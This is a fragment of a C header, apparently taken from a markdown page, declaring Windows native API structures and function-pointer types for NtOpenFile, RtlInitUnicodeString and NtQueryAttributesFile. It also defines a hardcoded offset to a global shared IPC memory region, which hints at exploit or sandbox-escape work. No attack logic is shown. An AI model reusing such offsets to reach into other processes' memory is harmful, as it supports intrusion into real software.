#define OFFSET_TO_G_SHARED_IPC_MEMORY 0x000411c0

typedef _Return_type_success_(return >= 0) LONG NTSTATUS;

#define 	OBJ_CASE_INSENSITIVE   0x00000040

#define InitializeObjectAttributes(p, n, a, r, s) { \
     (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
     (p)->RootDirectory = r; \
     (p)->Attributes = a; \
     (p)->ObjectName = n; \
     (p)->SecurityDescriptor = s; \
     (p)->SecurityQualityOfService = NULL; \
     }

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _FILE_BASIC_INFORMATION {
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	ULONG         FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	} DUMMYUNIONNAME;
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef NTSTATUS(__stdcall *NT_OPEN_FILE)(OUT PHANDLE FileHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, OUT PIO_STATUS_BLOCK IoStatusBlock, IN ULONG ShareAccess, IN ULONG OpenOptions);
typedef void(*_RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSTATUS(*_NtQueryAttributesFile)(POBJECT_ATTRIBUTES ObjectAttributes, PFILE_BASIC_INFORMATION FileInformation);
```
